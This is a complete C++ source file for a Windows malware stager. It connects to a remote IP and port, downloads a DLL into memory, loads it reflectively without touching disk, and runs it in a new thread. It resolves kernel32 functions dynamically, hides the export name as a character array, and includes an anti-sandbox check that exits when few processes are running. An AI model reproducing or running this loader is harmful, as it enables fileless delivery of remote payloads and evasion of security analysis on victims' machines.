#define _WINSOCK_DEPRECATED_NO_WARNINGS 0
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <cstdlib>
#include <iostream>
#include "MemoryModule.h"
#include "kernal32-import.h"
#pragma comment(lib,"ws2_32.lib")

#define TOOLS_SIZE 1024*287744
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef VOID(*msg)(VOID);
PBYTE bFileBuffer = NULL;
CHAR* pSpace = NULL;

ImportCreateThread PigCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "CreateThread");
ImportVirtualProtect PigVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualProtect");
ImportVirtualProtectEx PigVirtualProtectEx = (ImportVirtualProtectEx)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualProtectEx");
ImportVirtualAlloc PigVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualAlloc");

void antixoxo() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return;
	}
	PROCESSENTRY32 petoo = { sizeof(petoo) };
	int proctoolnum = 0;
	for (BOOL ret = Process32First(hSnapshot, &petoo); ret; ret = Process32Next(hSnapshot, &petoo))
	{
		proctoolnum++;
	}
	if (proctoolnum <= 40)
	{
		exit(1);
	}
}

BOOL GetTOOL(const char* address, int port) {

	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = port;
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		return FALSE;
	}

	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		return FALSE;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr(address);


	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		dwError = GetLastError();
		return FALSE;
	}

	int ret = 0;
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);

	ZeroMemory(bFileBuffer, TOOLS_SIZE);

	Sleep(3000);
	pSpace = (CHAR*)PigVirtualAlloc(NULL, TOOLS_SIZE, MEM_COMMIT, PAGE_READWRITE);

	ret = recv(socks, (PCHAR)pSpace, TOOLS_SIZE, NULL);


	if (ret > 0)
	{
		closesocket(socks);
	}


	return TRUE;
}


int main(int argc, char* argv[])
{

	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer = new BYTE[TOOLS_SIZE];
	CHAR cFunctionName[] = { 'D','l','l','M','a','n','\0' };
	const char* address = NULL;
	int port;

	if (argc == 3)
	{
		printf("author@evilash\nThe target u wanna get DLL is %s:%s\n", argv[1],argv[2]);
		address = argv[1];
		port = atoi(argv[2]);

	}
	else if (argc > 3)
	{
		printf("Too many arguments supplied.\n");
	}
	else
	{
		printf("Usage: %s [ipaddr] [Port].\n", argv[0]);
	}

	antixoxo();

	GetTOOL(address,port);

	hModule = MemoryLoadLibrary(pSpace);

	if (hModule == NULL) {
		delete[] bFileBuffer;
		return -1;
	}

	DllMain = (Module)MemoryGetProcAddress(hModule, cFunctionName);

	DWORD dwThread;
	HANDLE hThread = PigCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);

	delete[] bFileBuffer;
	return GetLastError();
}